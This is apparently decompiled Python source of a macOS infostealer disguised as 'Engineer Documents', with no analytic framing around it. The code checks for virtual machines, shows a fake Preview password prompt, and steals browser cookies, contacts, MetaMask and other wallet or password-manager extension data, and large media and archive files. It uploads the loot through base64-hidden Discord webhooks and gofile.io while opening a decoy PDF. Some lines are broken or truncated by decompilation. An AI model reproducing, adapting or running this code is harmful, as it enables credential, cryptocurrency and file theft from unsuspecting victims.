# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: Engineer Documents.py
# Bytecode version: 3.10.0rc2 (3439)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

global user  # inserted
import platform
import time
import base64
import requests
import re
import subprocess
import os
import sys
import shutil
import shutil
import os
import uuid
import sqlite3
import time
import browser_cookie3
import pandas as pd
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from os import listdir
from tinytag import TinyTag
user = str(os.environ['USER'])

def killSwitch():
    sys.exit()

def antiVM():
    hwModel = subprocess.run('sysctl -n hw.model', shell=True, capture_output=True)
    resp = str(hwModel.stdout)[2:][:3]
    if resp!= 'Mac':
        killSwitch()
    hwMemsize = subprocess.run('sysctl -n hw.memsize', shell=True, capture_output=True)
    resp = str(hwMemsize.stdout)[2:][:(-3)]
    if int(resp) < 3999999999:
        killSwitch()
    ioPlat = subprocess.run('ioreg -rd1 -c IOPlatformExpertDevice', shell=True, text=True, capture_output=True)
    resp = ioPlat.stdout
    IOPlatformSN = str(re.search('(?<=IOPlatformSerialNumber\" = \")[^\\\"]*', resp).group())
    if IOPlatformSN == 0:
        killSwitch()
    boardiD = str(re.search('(?<=board-id\" = <\")[^\\\"]*', resp).group())
    if 'VirtualBox' in boardiD:
        killSwitch()
    if 'VM Ware' in boardiD:
        killSwitch()
    manuF = str(re.search('(?<=manufacturer\" = <\")[^\\\"]*', resp).group())
    if 'Apple' in manuF:
        break
    killSwitch()
    usbD = subprocess.run('ioreg -rd1 -c IOUSBHostDevice | grep \"USB Vendor Name\"', shell=True, text=True, capture_output=True)
    resp = usbD.stdout
    if 'VMware' in str(resp):
        killSwitch()
    if 'VirualBox' in str(resp):
        killSwitch()
    ioRegL = subprocess.run('ioreg -l | grep -i -c -e \"virtualbox\" -e \"oracle\" -e \"vmware\"', shell=True, text=True, capture_output=True)
    resp = ioRegL.stdout
    if int(resp) > 0:
        killSwitch()
    vmFolder = os.path.exists('//Library/Application Support/VMWare Tools')
    if vmFolder == True:
        killSwitch()
    procesS = subprocess.run('pgrep vmware-tools-daemon', shell=True, text=True, capture_output=True)
    resp = procesS.stdout
    if len(resp) > 0:
        killSwitch()
    mac = ':'.join(re.findall('...', '%012x' % uuid.getnode()))
    mcList = ['00:05:69', '00:0c:29', '00:1c:14', '00:50:56', '08:00:27', '00:1C:42', '00:16:42', '0A:00:27']
    if mac[:8] in mcList:
        killSwitch()

def getPassword():
    global userPass  # inserted
    user = str(os.environ['USER'])
    applescript = '\n    display dialog \"Preview needs permissions to access Downloads \n\nEnter Password Below\" default answer \"\" with title \"Preview\" with icon POSIX file \"/Users/' + str(user) + '/image.icns\" buttons {\"Allow\"} with hidden answer'
    p = subprocess.run('osascript -e \'{}\''.format(applescript), shell=True, capture_output=True)
    resp = p.stdout.decode('utf-8')
    resp = re.sub('^.*?:', '', resp)
    AADADF18 = str(re.sub('^.*?:', '', resp))
    if AADADF18[(-1)] == '\n':
        AADADF18 = AADADF18[:(-1)]
    a = subprocess.run('dscl /Local/Default -authonly ' + user + ' ' + AADADF18, shell=True, capture_output=True)
    resp1 = a.stdout.decode('utf-8')
    resp1 = re.sub('^.*?:', '', resp1)
    AADADF19 = str(re.sub('^.*?:', '', resp1))[:(-1)]
    if len(AADADF19) == 0:
        userPass = AADADF18
    else:  # inserted
        if len(AADADF19) > 0:
            getPassword()
getPassword()

def onLaunch():
    global user  # inserted
    AADAFD12 = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE2NjUzOTk3MDAzOTc3OTQzOS9pZUFTbU85Y0Y4QXVSZUNkWG13LTdaR3I2OFpGdmNVdkotZEU0ZU0xX0Zycmd2eV9fTWY1NVlwelpMTHRGNFU2cm1ZTg=='
    AADADFJ3 = str(base64.b64decode(AADAFD12).decode('utf-8'))
    AADADFD1 = requests.get('https://checkip.amazonaws.com').text
    DATACENTER = requests.get('http://ip-api.com/json/' + str(AADADFD1[:(-1)])).json()
    ISP = DATACENTER['isp']
    if ISP == 'Microsoft Corporation':
        killSwitch()
    cmd = 'system_profiler SPHardwareDataType | grep \'Hardware UUID\''
    result = subprocess.run(cmd, stdout=subprocess.PIPE, shell=True, check=True)
    HWID = result.stdout.decode().strip()
    user = str(os.environ['USER'])
    AADADF14 = platform.version()
    AADADF15 = listdir('/Volumes')
    ADADAFD3 = {'username': '7331', 'avatar_url': 'https://upload.wikimedia.org/wikipedia/en/thumb/0/00/Girl_Scouts_of_the_USA.svg/330px-Girl_Scouts_of_the_USA.svg.png', 'content': 'Target Info', 'embeds': [{'title': 'Target Info', 'description': '∶ ∷ ∵ ∴ ∵ ∴ ∵ ∷ ∶', 'color': '14160178', 'fields': [{'name': 'OS', 'value': AADADF14, 'inline': 'true'}, {'name': 'IP', 'value': AADADFD1, 'inline': 'true'}, {'name': 'ISP', 'value': str(ISP), 'inline': 'false'}, {'name': 'User', 'value': str(user), 'inline': 'false'}, {'name': 'HWID', 'value': str(AADADF15), 'inline': 'true'}]}]}
    r = requests.post(AADADFJ3, json=ADADAFD3)
    url = 'https://t.ly/CDp0r'
    r = requests.get(url, stream=True)
    with open('/Users/' + str(user) + '/temp.pdf', 'wb') as pdf:
        shutil.copyfileobj(r.raw, pdf)
        pdf.close()
    subprocess.call(['open', '/Users/' + str(user) + '/temp.pdf'])
onLaunch()

def chromePath():
    cookies = os.path.exists('/Users/' + user + '/Library/Application Support/Google')
    if cookies == True:
        chromeDestroy()

def chromeDestroy():
    cookiesWH = str(base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE2NjU0MDUyNTUyNTAxMjU2MS9weEs1bWZzNGpsN3dnaTY2N09wcjlTSkZOV0V5RGlhVkllTUMxeVR3T01jeHBJdVpHblBraWwtNWswTE43MU12Qi1GVA==').decode('utf-8'))
    folder = os.makedirs('/Users/' + user + '/~/Documents/Chrome')
    sites = ['google.com', 'dropbox.com', 'filepass.com', 'twitter.com', 'instagram.com', 'wetransfer.com', 'drive.google.com', 'pcloud.com', 'icloud.com', 'app.massive.io', 'massive.io', 'wesendit.com', 'mail.google.com', 'myaccount.google.com', 'soundcloud.com', 'frame.io', 'backblaze.com', 'secure.backblaze.com', 'onedrive.live.com', 'nextcloud.com', 'hightail.com', 'spaces.hightail.com', 'appleid.apple.com']
    i = 0
    try:
        for url in sites:
            cookies = browser_cookie3.safari(domain_name=sites[i])
            site = os.makedirs('/Users/' + user + '/~/Documents/Chrome/Sites/' + sites[i])
            path = '/Users/' + user + '/~/Documents/Chrome/Sites/' + sites[i] + '/' + sites[i] + '.txt'
            f = open(path, 'w')
            f.write(str(cookies))
            f.close()
            time.sleep(0.1)
            i += 1
        zip = shutil.make_archive('/Users/' + user + '/Chrome Cookies', 'zip', '/Users/' + user + '/~/Documents/Chrome/Sites')
        clear = shutil.rmtree('/Users/' + user + '/~')
        data = {'username': 'Girl Scouts', 'avatar_url': 'https://upload.wikimedia.org/wikipedia/en/thumb/0/00/Girl_Scouts_of_the_USA.svg/330px-Girl_Scouts_of_the_USA.svg.png', 'content': 'Uploading Chrome Cookies!'}
        r = requests.post(cookiesWH, data)
        r = requests.post(cookiesWH, files={'file': open('/Users/' + user + '/Chrome Cookies.zip', 'rb')})
        r.close()
        clear = os.remove('/Users/' + user + '/Chrome Cookies.zip')
    except:
        clear = shutil.rmtree('/Users/' + user + '/~')
chromePath()

def safariPath():
    cookies = os.path.exists('/Users/' + user + '/Library/Cookies/Cookies.binarycookies')
    cookies2 = os.path.exists('/Users/' + user + '/Library/Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies')
    if cookies == True:
        path = '/Users/' + user + '/Library/Cookies/Cookies.binarycookies'
        safariDestroy(path)
    else:  # inserted
        path = '/Users/' + user + '/Library/Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies'
        safariDestroy(path)

def safariDestroy(path):
    cookiesWH = str(base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE2NjU0MDUyNTUyNTAxMjU2MS9weEs1bWZzNGpsN3dnaTY2N09wcjlTSkZOV0V5RGlhVkllTUMxeVR3T01jeHBJdVpHblBraWwtNWswTE43MU12Qi1GVA==').decode('utf-8'))
    folder = os.makedirs('/Users/' + user + '/~/Documents/Safari')
    sites = ['google.com', 'dropbox.com', 'filepass.com', 'twitter.com', 'instagram.com', 'wetransfer.com', 'drive.google.com', 'pcloud.com', 'icloud.com', 'app.massive.io', 'massive.io', 'wesendit.com', 'mail.google.com', 'myaccount.google.com', 'soundcloud.com', 'frame.io', 'backblaze.com', 'secure.backblaze.com', 'onedrive.live.com', 'nextcloud.com', 'hightail.com', 'spaces.hightail.com']
    i = 0
    try:
        for url in sites:
            cookies = browser_cookie3.safari(domain_name=sites[i])
            site = os.makedirs('/Users/' + user + '/~/Documents/Safari/Sites/' + sites[i])
            path = '/Users/' + user + '/~/Documents/Safari/Sites/' + sites[i] + '/' + sites[i] + '.txt'
            f = open(path, 'w')
            f.write(str(cookies))
            f.close()
            time.sleep(0.1)
            i += 1
        zip = shutil.make_archive('/Users/' + user + '/Safari Cookies', 'zip', '/Users/' + user + '/~/Documents/Safari/Sites')
        clear = shutil.rmtree('/Users/' + user + '/~')
        data = {'username': 'Girl Scouts', 'avatar_url': 'https://upload.wikimedia.org/wikipedia/en/thumb/0/00/Girl_Scouts_of_the_USA.svg/330px-Girl_Scouts_of_the_USA.svg.png', 'content': 'Uploading Safari Cookies!'}
        r = requests.post(cookiesWH, data)
        r = requests.post(cookiesWH, files={'file': open('/Users/' + user + '/Safari Cookies.zip', 'rb')})
        r.close()
        clear = os.remove('/Users/' + user + '/Safari Cookies.zip')
    except:
        clear = shutil.rmtree('/Users/' + user + '/~')
        print('error')
safariPath()

def phoneBook():
    path = os.path.exists('/Users/' + user + '/Library/Application Support/AddressBook/AddressBook-v22.abcddb')
    if path == True:
        con = sqlite3.connect('/Users/' + user + '/Library/Application Support/AddressBook/AddressBook-v22.abcddb')
        df = pd.read_sql_query('SELECT * from ZABCDEMAILADDRESS', con)
        df.index.name = 'Index'
        df = df.drop(columns=['Z_PK', 'Z_ENT', 'Z_OPT', 'ZIOSLEGACYIDENTIFIER', 'ZISPRIMARY', 'ZISPRIVATE', 'ZORDERINGINDEX', 'ZOWNER', 'ZLABEL', 'ZUNIQUEID', 'Z21_OWNER'])
        df2 = pd.read_sql_query('SELECT * from ZABCDPHONENUMBER', con)
        df2.index.name = 'Index'
        df2 = df2.drop(columns=['Z_PK', 'Z_ENT', 'Z_OPT', 'ZIOSLEGACYIDENTIFIER', 'ZISPRIMARY', 'ZISPRIVATE', 'ZORDERINGINDEX', 'ZOWNER', 'ZLABEL', 'ZUNIQUEID', 'Z21_OWNER', 'ZAREACODE', 'ZCOUNTRYCODE', 'ZEXTENSION', 'ZLOCALNUMBER', 'ZLASTFOURDIGITS'])
        temp = os.makedirs('/Users/' + user + '/~/Temp/')
        csv1 = df.to_csv('/Users/' + user + '/~/Temp/Email Addresses.csv')
        csv2 = df2.to_csv('/Users/' + user + '/~/Temp/Phone Numbers.csv')
        zip = shutil.make_archive('/Users/' + user + '/~/Address Book', 'zip', '/Users/' + user + '/~/Temp/')
        phoneWH = base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE2NjU0MDgyMDY2MTQwNzg2NS9YOGV3T3V5VThlYURmdS1YUl9TWFhwRzQ1RUxseEFkSDJIVC12NTVieG1aeTRkYnJCNndOTXVqekhZMkdOZ0dIb0prcw==')
        data = {'username': 'Girl Scouts', 'avatar_url': 'https://upload.wikimedia.org/wikipedia/en/thumb/0/00/Girl_Scouts_of_the_USA.svg/330px-Girl_Scouts_of_the_USA.svg.png', 'content': 'Uploading Contacts!'}
        r = requests.post(phoneWH, data)
        r = requests.post(phoneWH, files={'file': open('/Users/' + user + '/~/Address Book.zip', 'rb')})
        r.close()
        con.close()
        cleanup = shutil.rmtree('/Users/' + user + '/~')
phoneBook()

def firefoxDestroy():
    path = '/Users/' + user + '/Library/Application Support/Firefox/Profiles'
    cookies = os.path.exists(path)
    if cookies == True:
        for file in os.listdir(path):
            if file.endswith('.default-release'):
                cookiesPath = str(os.path.join(path, file))
        if os.path.exists(cookiesPath + '/cookies.sqlite') == True:
            con = sqlite3.connect(cookiesPath + '/cookies.sqlite')
            df = pd.read_sql_query('SELECT * from moz_cookies', con)
            df.index.name = 'Index'
            df = df.drop(columns=['originAttributes', 'isSecure', 'inBrowserElement', 'sameSite', 'rawSameSite', 'schemeMap', 'id'])
            os.makedirs('/Users/' + user + '/~/')
            csv = df.to_csv('/Users/' + user + '/~/Cookies Firefox.csv')
            cookiesWH = base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE2NjU0MDUyNTUyNTAxMjU2MS9weEs1bWZzNGpsN3dnaTY2N09wcjlTSkZOV0V5RGlhVkllTUMxeVR3T01jeHBJdVpHblBraWwtNWswTE43MU12Qi1GVA==')
            data = {'username': 'Girl Scouts', 'avatar_url': 'https://upload.wikimedia.org/wikipedia/en/thumb/0/00/Girl_Scouts_of_the_USA.svg/330px-Girl_Scouts_of_the_USA.svg.png', 'content': 'Uploading Firefox Cookies!'}
            r = requests.post(cookiesWH, data)
            r = requests.post(cookiesWH, files={'file': open('/Users/' + user + '/~/Cookies Firefox.csv', 'rb')})
            r.close()
            con.close()
            cleanup = shutil.rmtree('/Users/' + user + '/~/')
firefoxDestroy()

def metaMask():
    check = os.path.exists('/Users/' + user + '/Library/Application Support/Google/Chrome/Default/Extensions/nkbihfbeogaeaoehlefnkodbefgpgknn')
    if check == True:
        folder = '/Users/' + user + '/Library/Application Support/Google/Chrome/Default/Extensions/nkbihfbeogaeaoehlefnkodbefgpgknn'
        shutil.copytree(folder, '/Users/' + user + '/~/Ext')
        for i in os.walk(folder, topdown=False):
            if i[0].split('/')[(-1)] == 'images':
                shutil.rmtree(i[0])
        folder2 = '/Users/' + user + '/Library/Application Support/Google/Chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
        shutil.copytree(folder2, '/Users/' + user + '/~/Settings')
        shutil.make_archive('/Users/' + user + '/' + user + ' Metamask', 'zip', '/Users/' + user + '/~/')
        mmWH = base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE2NjU0MTEwMDYzNTM5MDAyMy9ra0NNSnlublRqaFZ0cFJRQmFLdVI3NVRWY0hudnlZRTIzR1Y5RXUzWWVJbjhnYXRNX3lsRjlXOW9icU9RUU9xcGlHQw==')
        data = {'username': 'Girl Scouts', 'avatar_url': 'https://upload.wikimedia.org/wikipedia/en/thumb/0/00/Girl_Scouts_of_the_USA.svg/330px-Girl_Scouts_of_the_USA.svg.png', 'content': 'Uploading Chrome Metamask Files!'}
        r = requests.post(mmWH, data)
        name = '/Users/' + user + '/' + user + ' Metamask.zip'
        r = requests.post(mmWH, files={'file': open(name, 'rb')})
        r.close()
        shutil.rmtree('/Users/' + user + '/~')
        os.remove(name)
    check2 = os.path.exists('/Users/' + user + '/Library/Application Support/Firefox/Profiles/')
    path = '/Users/' + user + '/Library/Application Support/Firefox/Profiles/'
    if check2 == True:
        for file in os.listdir(path):
            if file.endswith('.default-release'):
                path = str(os.path.join(path, file))
        mmPath = path + '/extensions/webextension@metamask.io.xpi'
        if os.path.exists(mmPath) == True:
            extPath = path + '/storage/default/https+++metamask.io'
            os.makedirs('/Users/' + user + '/~/Ext')
            shutil.copy2(mmPath, '/Users/' + user + '/~/Ext')
            shutil.copytree(extPath, '/Users/' + user + '/~/Settings')
            shutil.make_archive('/Users/' + user + '/' + user + ' FF Metamask', 'zip', '/Users/' + user + '/~/')
            mmWH = base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE2NjU0MTEwMDYzNTM5MDAyMy9ra0NNSnlublRqaFZ0cFJRQmFLdVI3NVRWY0hudnlZRTIzR1Y5RXUzWWVJbjhnYXRNX3lsRjlXOW9icU9RUU9xcGlHQw==')
            data = {'username': 'Girl Scouts', 'avatar_url': 'https://upload.wikimedia.org/wikipedia/en/thumb/0/00/Girl_Scouts_of_the_USA.svg/330px-Girl_Scouts_of_the_USA.svg.png', 'content': 'Uploading Firefox Metamask Files!'}
            r = requests.post(mmWH, data)
            name = '/Users/' + user + '/' + user + ' FF Metamask.zip'
            r = requests.post(mmWH, files={'file': open(name, 'rb')})
            r.close()
            shutil.rmtree('/Users/' + user + '/~')
            os.remove(name)
metaMask()

def wallets():
    info = base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE2NjU0MTEwMDYzNTM5MDAyMy9ra0NNSnlublRqaFZ0cFJRQmFLdVI3NVRWY0hudnlZRTIzR1Y5RXUzWWVJbjhnYXRNX3lsRjlXOW9icU9RUU9xcGlHQw==')
    name = ['Authenticator', 'EOS Authenticator', 'Bitwarden', 'KeePassXC', 'Dashlane', '1Password', 'NordPass', 'Keeper', 'RoboForm', 'LastPass', 'BrowserPass', 'MYKI', 'Splikity', 'CommmonKey', 'Zoho Vault', 'Norton Password Manager', 'Avira Password Manager', 'Trezor Password Manager', 'TronLink', 'BinanceChain', 'Coin98', 'iWallet', 'Wombat', 'MEW CX', 'NeoLine', 'Keplr', 'Sollet', 'ICONex', 'KHC', 'Tezbox', 'Byone', 'OneKey', 'DAppPlay', 'BitClip', 'Steem Keychain', 'Nash Extension', 'Hycon Lite Client', 'ZilPay', 'Leaf Wallet', 'Cyano Wallet', 'Cyano Wallet Pro', 'Nabox Wallet', 'Polymesh Wallet', 'Nifty Wallet', 'Liquality Wallet', 'Math Wallet', 'Coinbase Wallet', 'Clover Wallet', 'Yoroi', 'Guarda',
    extID = ['bhghoamapcdpbohphigoooaddinpkbai', 'oeljdldpnmdbchonielidgobddffflal', 'nngceckbapebfimnlniiiahkandclblb', 'oboonakemofpalcgghocfoadofidjkkk', 'fdjamakpfbbddfjaooikfcpapjohcfmg', 'aeblfdkhhhdcdjpifhhbdiojplfjncoa', 'fooolghllnmhmmndgjiamiiodkpenpbb', 'bfogiafebfohielmmehodmfbbebbbpei', 'pnlccmojcmeohlpggmfnbbiapkmbliob', 'hdokiejnpimakedhajhdlcegeplioahd', 'naepdomgkenhinolocfifgehidddafch', 'bmikpgodpkclnkgmnpphehdgcimmided', 'jhfjfclepacoldmjmkmdlmganfaalklb', 'chgfefjpcobfbnpmiokfjjaglahmnded', 'igkpcodhieompeloncfnbekccinhapdb', 'admmjipmmciaobhojoghlmleefbicajg', 'caljgklbbfbcjjanaijlacgncafpegll', 'imloifkgjagghnncjkhggdhalmcnfklk', 'ibnejdfjmmkpcnlpebklmnkoeoihofec', 'fhbohimaelbohpjbbldcngcnapndodjp', 'aeachknmefphepccionboohckonoeemg', 'kncchdigobghenbbaddojjnnaogfppfj', 'amkmjjmmflddogmhpjloimipbofnfjih', 'nlbmnnijcnlegkjjpcfjclmcfggfefdm', 'cphhlgmgameodnhkjdmkpanlelnlohao', 'aiifbnbfobpmeekipheeijimdpnlpgpp', 'dmkamcknogkgcdfhhbddcghachkejeap', 'fhmfendgdocmcbmfikdcogofphimnkno', 'flpiciilemghbmfalicajoolhkkenfel', 'hcflpincpppdclinealmandijcmnkbgn', 'mnfifefkajgofkcjkemidiaecocnkjeh', 'nlgbhdfgdhgbiamfdfmbikcdghidoadd', 'infeboajgfhgbjpjbeppbkgnabfdkdaf', 'lodccjjbdhfakaekdiahmedfbieldgik', 'ijmpgkjfkbfhoebgogflfebnmejmfbml', 'lkcjlnjfpbikmcmbachjpdbijejflpcm', 'onofpnbbkehpmmoabgpcpmigafmmnjhl', 'bcopgchhojmggmffilplmbdicgaihlkp', 'klnaejjgbibmhlephnhpmaofohgkpgkd', 'cihmoadaighcejopammfbmddcmdekcje', 'dkdedlpgdmmkkfjabffeganieamfklkm', 'icmkfkmjoklfhlfdkkkgpnpldkgdmhoe', 'nknhiehlklippafakaeklbeglecifhad', 'jojhfeoedkpkglbfimdfabpdfjaoolaf', 'jbdaocneiiinmjbjlgalhcelgbejmnid', 'kpfopkelmapcoipemfendmdcghnegimn', 'afbcbjpbpfadlkmhmclhkeeodmamcflc', 'hnfanknocfeofbddgcijnmhnfnkdnaad', 'nhnkbkgjikgcigadomkphalanndcapjk', 'ffnbelfdoeiohenkjibnmadjiehjhajb',
    i = 0
    for v in name:
        id = extID[i]
        check = os.path.exists('/Users/' + user + '/Library/Application Support/Google/Chrome/Default/Extensions/' + id)
        if check == True:
            value = name[i]
            folder = '/Users/' + user + '/Library/Application Support/Google/Chrome/Default/Extensions/' + id
            shutil.copytree(folder, '/Users/' + user + '/~/Ext')
            for ii in os.walk(folder, topdown=False):
                if ii[0].split('/')[(-1)] == 'images':
                    shutil.rmtree(i[0])
            folder2 = '/Users/' + user + '/Library/Application Support/Google/Chrome/Default/Local Extension Settings/' + id
            shutil.copytree(folder2, '/Users/' + user + '/~/Settings')
            shutil.make_archive('/Users/' + user + '/' + (user + ' ' + value), 'zip', '/Users/' + user + '/~/')
            file = '/Users/' + user + '/' + user + ' ' + value + '.zip'
            uFile = {'file': open(file, 'rb')}
            r = requests.get('https://api.gofile.io/getServer').json()
            server = str(r['data']['server'])
            time.sleep(1)
            r = requests.post('https://' + server + '.gofile.io/uploadFile', files=uFile)
            r = r.json()
            downloadUrl = r['data']['downloadPage']
            url = downloadUrl
            AADADFC = {'username': 'Girl Scouts', 'avatar_url': 'https://upload.wikimedia.org/wikipedia/en/thumb/0/00/Girl_Scouts_of_the_USA.svg/330px-Girl_Scouts_of_the_USA.svg.png', 'content': value + ' ' + url}
            r = requests.post(url=info, data=AADADFC)
            shutil.rmtree('/Users/' + user + '/~')
            os.remove(file)
        i += 1
wallets()

def AADADF17(user):
    url = 'https://t.ly/G010T'
    r = requests.get(url, stream=True)
    with open('/Users/' + str(user) + '/image.icns', 'wb') as f:
        shutil.copyfileobj(r.raw, f)
        f.close()
    temp = ''
    AADADF18 = 'sz9mmr6rvnu'
    folders = ['/Downloads', '/Music', '/Documents', '/Desktop', '/Music', '/Pictures', '/Movies', '/Public']
    try:
        for i in folders:
            cmd = 'echo ' + AADADF18 + ' | sudo -S chmod 777 /Users/' + user + str(i)
            a = subprocess.run(cmd, shell=True, capture_output=True)
            if len(a.stdout.decode('utf-8')) == 0:
                yep = yep
    except:
        yep = 'yep'
    AADADF19()

def AADADF19():
    AADAFD12 = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE2NjU0MTgwNzM1MDQ1MjM3NS8tUGZ0bmI0OVlpUGtERjFWS3plSHV0RDJES09pV3IyWHlUZzY1Y01YdHVmYXZCYmJPWXRHOERpMElpNnYzSEtOTXQteA=='
    AADADFJ3 = str(base64.b64decode(AADAFD12).decode('utf-8'))
    AADADF15 = listdir('/Volumes')
    drives = []
    for i in AADADF15:
        drives.append(i)
    for drive in drives:
        if os.path.exists('/Users') == True:
            AADADFC = {'username': 'Girl Scouts', 'avatar_url': 'https://upload.wikimedia.org/wikipedia/en/thumb/0/00/Girl_Scouts_of_the_USA.svg/330px-Girl_Scouts_of_the_USA.svg.png', 'content': 'Reading Content of ' + drive}
            r = requests.post(AADADFJ3, data=AADADFC)
            for path, subdirs, files in os.walk('/Users'):
                subdirs[:] = [d for d in subdirs if d not in ['Xcode']]
                for filename in files:
                    AADADF20(filename, path, AADADFJ3)
        else:  # inserted
            AADADFC = {'username': 'Girl Scouts', 'avatar_url': 'https://upload.wikimedia.org/wikipedia/en/thumb/0/00/Girl_Scouts_of_the_USA.svg/330px-Girl_Scouts_of_the_USA.svg.png', 'content': 'Reading Content of ' + drive}
            r = requests.post(AADADFJ3, data=AADADFC)
            yep = os.path.exists(drive + '/Users/')
            if yep == True:
                for path, subdirs, files in os.walk(i):
                    subdirs[:] = [d for d in subdirs if d not in ['/Users']]
                    for filename in files:
                        print(filename)
                        AADADF20(filename, path, AADADFJ3)
            else:  # inserted
                AADADFC = {'username': 'Girl Scouts', 'avatar_url': 'https://upload.wikimedia.org/wikipedia/en/thumb/0/00/Girl_Scouts_of_the_USA.svg/330px-Girl_Scouts_of_the_USA.svg.png', 'content': 'Reading Content of ' + drive}
                r = requests.post(AADADFJ3, data=AADADFC)
                for path, subdirs, files in os.walk(str(drive)):
                    subdirs[:] = [d for d in subdirs if d not in ['system']]
                    for filename in files:
                        print(filename)
                        AADADF20(filename, path, AADADFJ3)

def AADADF20(filename, path, hook):
    FILES = str(base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE2NjU0MTgwNzM1MDQ1MjM3NS8tUGZ0bmI0OVlpUGtERjFWS3plSHV0RDJES09pV3IyWHlUZzY1Y01YdHVmYXZCYmJPWXRHOERpMElpNnYzSEtOTXQteA==').decode('utf-8'))
    if filename.endswith(('.mp3', '.mp4', '.m4a', '.wav', '.flac', '.aif', '.zip', '.rar', '.7zip', '.mov', '.mkv', '.avi')):
        try:
            filesize = os.path.getsize(path + '/' + filename)
            if filename.endswith(('.mp3', '.m4a', '.wav', '.flac', '.aif')):
                tag = TinyTag.get(path + '/' + filename)
                if tag.duration > 30:
                    file = path + '/' + filename
                    uFile = {'file': open(file, 'rb')}
                    r = requests.get('https://api.gofile.io/getServer').json()
                    server = str(r['data']['server'])
                    time.sleep(5)
                    r = requests.post('https://' + server + '.gofile.io/uploadFile', files=uFile)
                    r = r.json()
                    downloadUrl = r['data']['downloadPage']
                    url = downloadUrl
                    AADADFC = {'username': 'Girl Scouts', 'avatar_url': 'https://upload.wikimedia.org/wikipedia/en/thumb/0/00/Girl_Scouts_of_the_USA.svg/330px-Girl_Scouts_of_the_USA.svg.png', 'content': filename + ' ' + url}
                    r = requests.post(url=FILES, data=AADADFC)
            if filesize > 1000000:
                file = path + '/' + filename
                uFile = {'file': open(file, 'rb')}
                r = requests.get('https://api.gofile.io/getServer').json()
                server = str(r['data']['server'])
                time.sleep(5)
                r = requests.post('https://' + server + '.gofile.io/uploadFile', files=uFile)
                r = r.json()
                downloadUrl = r['data']['downloadPage']
                url = downloadUrl
                AADADFC = {'username': 'Girl Scouts', 'avatar_url': 'https://upload.wikimedia.org/wikipedia/en/thumb/0/00/Girl_Scouts_of_the_USA.svg/330px-Girl_Scouts_of_the_USA.svg.png', 'content': filename + ' ' + url}
                r = requests.post(url=FILES, data=AADADFC)
        except:
            return None
AADADF17(user)